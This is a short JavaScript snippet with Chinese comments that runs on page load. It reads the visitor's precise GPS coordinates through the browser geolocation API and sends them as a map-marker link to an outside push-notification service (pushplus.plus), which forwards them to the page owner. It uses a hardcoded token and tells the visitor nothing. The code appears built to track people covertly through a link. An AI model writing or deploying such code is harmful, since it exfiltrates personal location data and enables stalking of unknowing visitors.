        window.addEventListener("load", function() {
            // 获取用户精确经纬度
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    
                    // 构建URL链接
                    var url = "https://www.pushplus.plus/send?token=2999d55f4c3c4bfebaaa7370040881f2&title=2003&content=https://uri.amap.com/marker?position=";
                    url += longitude + "," + latitude;

                    // 发起GET请求
                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", url, true);
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4 && xhr.status === 200) {
                            // 请求成功后的处理
                            console.log("GET请求成功");
                            console.log(xhr.responseText);
                        } else {
                            // 请求失败后的处理
                            console.log("GET请求失败");
                        }
                    };
                    xhr.send();
                });
            } else {
                console.log("Geolocation不可用");
            }
        });
